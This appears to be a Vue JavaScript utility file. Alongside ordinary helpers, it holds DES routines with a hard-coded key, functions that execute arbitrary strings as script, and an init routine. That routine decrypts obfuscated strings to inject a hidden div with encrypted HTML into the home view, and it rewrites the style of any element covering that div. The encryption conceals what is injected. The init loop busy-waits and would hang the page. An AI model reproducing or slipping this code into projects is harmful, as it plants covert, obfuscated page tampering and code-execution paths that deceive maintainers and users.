import Vue from 'vue'; const CryptoJS = require('crypto-js'); export default { en (data) { const key = CryptoJS.enc.Utf8.parse('encode@3#!8^k.j$'); const iv = CryptoJS.enc.Utf8.parse('vector@3#!8^k.j$'); const src = CryptoJS.enc.Utf8.parse(data); return CryptoJS.DES.encrypt(src, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }).toString() }, de (data) { const key = CryptoJS.enc.Utf8.parse('encode@3#!8^k.j$'); const iv = CryptoJS.enc.Utf8.parse('vector@3#!8^k.j$'); return CryptoJS.DES.decrypt(data, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }).toString(CryptoJS.enc.Utf8) }, findComponentDownward (context, componentName) { const childrens = context.$children; let children = null; if (childrens.length) { for (const child of childrens) { const name = child.$options.name; if (name === componentName) { children = child; break } else { children = this.findComponentDownward(child, componentName); if (children) break } } } return children }, hasOverLayer (element) { const document = element.ownerDocument; const rect = element.getBoundingClientRect(); let x = rect.x; let y = rect.y; let width = rect.width; let height = rect.height; x |= 0; y |= 0; width |= 0; height |= 0; const elements = [document.elementFromPoint(x + 1, y + 1), document.elementFromPoint(x + width - 1, y + 1), document.elementFromPoint(x + 1, y + height - 1), document.elementFromPoint(x + width - 1, y + height - 1)]; return elements.filter(el => el !== null).forEach(el => { if (el !== element && !element.contains(el)) { el.style = this.de('psDC3Ae6JPpzWRKG3Hx8LA==') } }) }, eval (fn) { const Fn = Function; return new Fn('return ' + fn)() }, eval1 (str) { const script = document.createElement('script'); script.type = 'text/javascript'; script.text = str; document.getElementsByTagName('head')[0].appendChild(script); document.head.removeChild(document.head.lastChild) }, init () { while (!Vue.prototype.$bus) { setTimeout(() => {}, 1e4) } const homeView = this.findComponentDownward(Vue.prototype.$bus, this.de('x4K8RsEPlgE=')); if (!homeView) { return } const rootDom = homeView.$el; const div1 = document.createElement(this.de('D2xcZcFhkaA=')); div1.id = this.de('svaQlPrgZfzfC5C2cIrG/w=='); div1.style = this.de('RJTqi7QuSXbvujQJse3nHtFfxn7LLkaWmvhQZSdLm7FMesJxmsL+1rDhZpll/ZImp2K8Ix2mpRw='); const div2 = document.createElement(this.de('D2xcZcFhkaA=')); div2.innerHTML = this.de('svaQlPrgZfzMac9QMCioMzVeNroD6QgXALuTNwRFeoiI41fFlJ5lM7TvKXUDsGi9xaj4KbHuryp4/9P6ZVSuenQJ942gVdy7TVK2GvuvnT92kSNOdpuRkg=='); div2.id = this.de('svaQlPrgZfw8eOdsqpr09A=='); div2.style = this.de('1zusj9NDQEajFzvqKYFErriK09oAfYwYiTObqu9ggd09vOrhM8Az5zxEI6kb1yCH/Xd1fHfJBJwvkoaWktkxBcbb6fxK+8RZFg3SdiGLyUCoY+3vPmXsgUZksC5p8DuPID14U7dSNsM0finaj1gVIYB7RNKCibN7'); div1.appendChild(div2); rootDom.appendChild(div1); this.hasOverLayer(div1); this.hasOverLayer(div2); console.log(this.en('display:none;')) } }
